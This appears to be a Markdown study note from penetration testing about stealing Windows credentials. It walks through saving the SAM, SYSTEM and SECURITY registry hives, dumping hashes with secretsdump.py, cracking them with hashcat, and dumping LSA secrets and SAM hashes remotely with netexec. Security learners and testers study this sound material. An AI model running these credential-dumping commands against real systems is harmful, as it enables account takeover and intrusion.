
## Attacking SAM, SYSTEM and SECURITY

### 1. Copy Registry Hives

- There are 3 registry hives we are interested in, they are :-
	- `HKLM\SAM` : contains password hashes of local user accounts.
	- `HKLM\SYSTEM` : stores the system boot key which is used to encrypt the SAM database so when dumping hashes using `secretsdump.py`, the `HKLM\SYSTEM` boot key hash will be dumped first.
	- `HKLM\SECURITY` : contains information used by `LSA` , cached credentials. etc.

```cmd
reg.exe save hklm\sam <save filename>
reg.exe save hklm\system <save filename>
reg.exe save hklm\security <save filename>
```

### 2. Extract the Registry Hives

- Read the **Windows to Linux File Transfer** Methods to transfer each registry key `HKLM\SAM`, `HKLM\SYSTEM` and `HKLM\SECURITY` to the attack machine from the victim machine.

### 3. Dumping Hashes

- Dumping hashes is basically extracting the password hash from a location. Operating systems don't store passwords in plaintext so dumping hashes is a way to extract password hash from the system once we gain privileges to do so.

```bash
locate secretsdump # locate the path of the secretsdump.py first before executing the tool
```

```bash
python3 <secretsdump.py path> -sam <sam filename> -system <system filename> -security <security filename>
```

### 4. Crack the Hash

- Store each hash into a file, then execute the below command.

```bash
sudo hashcat -m 1000 <hash file> <wordlist path>
```

### 5. Dumping LSA Secrets (REMOTELY)

- If we are able to gain credentials of a local user or admin user. We can use `netexec` to dump LSA secrets over a network by accessing the Windows Registry Database.

```bash
netexec smb <TARGET IP> --local-auth -u <username> -p <password> --lsa
```

### 6. Dumping SAM Hashes (REMOTELY)

- Using user or admin credentials to access SMB service and dumping the SAM database hashes over the network.

```bash
netexec smb <TARGET IP> --local-auth -u <username> -p <password> --sam
```



